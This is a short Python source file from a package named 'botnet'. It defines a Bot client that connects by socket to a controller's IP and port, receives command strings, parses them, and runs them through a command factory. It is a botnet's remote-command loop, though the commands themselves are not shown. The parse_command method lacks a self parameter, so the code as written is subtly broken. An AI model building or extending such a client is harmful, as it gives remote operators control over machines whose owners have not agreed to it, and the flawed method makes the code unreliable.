import socket

from botnet.commands.command_factory import command_factory

class Bot:
    def __init__(self, ip, port):
        self._ip = ip
        self._port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connect()
        
    def parse_command(command_message):
        pairs = command_message.split(", ")

        command_pair = pairs.pop(0)
        command_parts = command_pair.split("=")
        command_name = command_parts[1]

        params = {}
        for pair in pairs:
            parts = pair.split("=")
            param_name = parts[0]
            param_value = parts[1]
            params[param_name] = param_value

        return command_name, params

    def execute_command(self, data):
        command_name, params = self.parse_command(data)
        command = command_factory(command_name, params)
        command.execute()
 
    def receive(self):
        return self.socket.recv(1024).decode()
        
    def send(self, message):
        self.socket.sendall(message.encode())

    def connect(self):
        self.socket.connect((self._ip, self._port))

    def close(self):
        self.socket.close()